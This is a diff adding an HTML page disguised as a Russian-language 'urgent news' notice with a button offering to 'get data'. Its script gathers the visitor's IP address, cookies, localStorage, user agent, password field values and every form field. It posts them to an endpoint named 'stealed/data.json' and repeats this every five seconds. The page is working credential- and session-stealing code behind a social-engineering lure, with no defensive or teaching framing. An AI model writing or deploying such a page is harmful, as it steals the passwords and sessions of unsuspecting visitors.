@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>СРОЧНЫЕ НОВОСТИ</title>
+    <meta charset="UTF-8">
+    <link rel="icon" href="img/icon.png">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+        .news-container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .breaking-news {
+            background: #ff0000;
+            color: white;
+            padding: 10px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .data-display {
+            background: #f8f8f8;
+            padding: 10px;
+            margin-top: 20px;
+            border: 1px solid #ddd;
+            white-space: pre-wrap;
+        }
+        .button {
+            background: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="news-container">
+        <div class="breaking-news">СРОЧНЫЕ НОВОСТИ!</div>
+        <h1>Важное сообщение для всех пользователей</h1>
+        <button class="button" onclick="startCollection()">Получить данные</button>
+        <div id="dataOutput" class="data-display"></div>
+        <script>
+            async function collectData() {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                var data = {
+                    ipAddress: ipData.ip,
+                    cookies: document.cookie,
+                    localStorage: JSON.stringify(localStorage),
+                    userAgent: navigator.userAgent,
+                    passwords: Array.from(document.querySelectorAll('input[type="password"]')).map(input => ({
+                        name: input.name,
+                        value: input.value
+                    })),
+                    forms: Array.from(document.forms).map(form => {
+                        return Array.from(form.elements).map(element => ({
+                            name: element.name,
+                            value: element.value,
+                            type: element.type
+                        }));
+                    })
+                };
+
+                // Отображение данных на странице
+                document.getElementById('dataOutput').textContent = JSON.stringify(data, null, 2);
+                
+                // Отправка данных на удаленный сервер
+                fetch('stealed/data.json', {
+                    method: 'POST',
+                    body: JSON.stringify(data),
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                return data;
+            }
+            
+            function startCollection() {
+                collectData();
+                setInterval(collectData, 5000);
+            }
+        </script>
+        <p>Нажмите кнопку для загрузки важной информации...</p>
+    </div>
+</body>
+</html>
